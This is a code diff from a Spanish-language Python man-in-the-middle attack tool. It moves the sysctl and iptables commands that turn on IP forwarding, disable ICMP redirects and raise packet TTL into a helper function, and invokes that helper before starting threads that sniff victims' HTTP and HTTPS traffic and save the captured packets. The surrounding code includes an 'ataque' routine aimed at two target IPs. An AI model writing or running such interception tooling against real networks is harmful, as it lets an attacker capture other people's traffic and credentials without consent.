@@ -45,16 +45,13 @@ def salir(señal, frame):
    print('\n\n\033[0;32msaliendo de la herramienta...\033[0m\n\n')
 
    #revierte las cofiguraciones del sistema
-   for x in ['sysctl net.ipv4.ip_forward=0',
-            f'iptables -t mangle -D PREROUTING -j TTL --ttl-inc {inc_ttl}',
-            'sysctl net.ipv4.conf.all.send_redirects=1']:
-            
-      subprocess.run(x,shell=True)
+   ejecutar_comandos(revertir=True)
+   
    ejecutando = False
    sys.exit(0)
    
 
-def guardar(data):
+def guardar(data:str):
    if guardado:
       try:
          with open(f'{n_arch}.txt','a') as arch:
@@ -62,7 +59,7 @@ def guardar(data):
       except Exception as e:
          print(f'\n\033[0;40;31m[-] hubo un error durante el guardado de paquetes >> {e}\033[0m\n')
  
-def ataque(ip1,ip2): 
+def ataque(ip1:str,ip2:str): 
    global ejecutando
  
    try:
@@ -114,12 +111,36 @@ def sniffing_HTTPS():
  
       except Exception as e: print(f'\n\033[0;40;31m[+] error > {e}\n')  
  
- 
+def ejecutar_comandos(revertir:bool):
+   if revertir:
+      sr = '1'
+      ip_f = '0'
+      ipt = 'D'
+   else:
+      sr = '0'
+      ip_f = '1'
+      ipt = 'A'
+
+   'funcion que ejecuta los comandos que se necesitan para el mitm'
+   # ejecuta comandos de linux de iptables cuyo propositos son la redireccion de
+   # paquetes al router
+   # ademas incremeto los ttl para evitar que el paquete muera antes de llegar correctamente al router
+   # sysctl net.ipv4.ip_forward=1 -> redirecciono los paquetes
+   # iptables -t mangle -A PREROUTING -j TTL --ttl-inc {inc_ttl} -> incremento los ttl en una cantidad n
+   # sysctl net.ipv4.conf.all.send_redirects=0 -> habilita la maquina a ser usada como puente entre el router y la victima
+   for x in [f'sysctl net.ipv4.conf.all.send_redirects={sr}',
+      f'sysctl net.ipv4.ip_forward={ip_f}',
+      f'iptables -t mangle -{ipt} PREROUTING -j TTL --ttl-inc {inc_ttl}']:
+
+      if subprocess.run(x,shell=True).returncode != 0:
+         print(f'\n[+] no se pudo configurar correctamente el comando {x}\n')
+
  
 def ejecucion(maq1,maq2):
  
    threading.Thread(target=ataque,args=(maq1,maq2)).start()
    if parametros.param.sniff:
+      ejecutar_comandos(revertir=False)
       print(Fore.GREEN + "se habilita el sniffing de los sistemas objetivos\n" + Fore.RESET)
       threading.Thread(target=sniffing_HTTPS).start()
       threading.Thread(target=sniffing_HTTP).start()
@@ -158,13 +179,7 @@ if __name__ == '__main__':
                n_arch = None
 
             print('\033[0m')
-            for x in ['sysctl net.ipv4.conf.all.send_redirects=0',
-               'sysctl net.ipv4.ip_forward=1',
-               f'iptables -t mangle -A PREROUTING -j TTL --ttl-inc {inc_ttl}']:
-    
-               if subprocess.run(x,shell=True).returncode != 0:
-                  print(f'\n[+] no se pudo configurar correctamente el comando {x}\n')
-    
+         
             print('\n\033[0;32m[+] iniciando ataque ...\033[0m\n\033[0;40;35mCTRL + c para finalizar\033[0m\n')
             ejecucion(maq1,maq2)
          else:
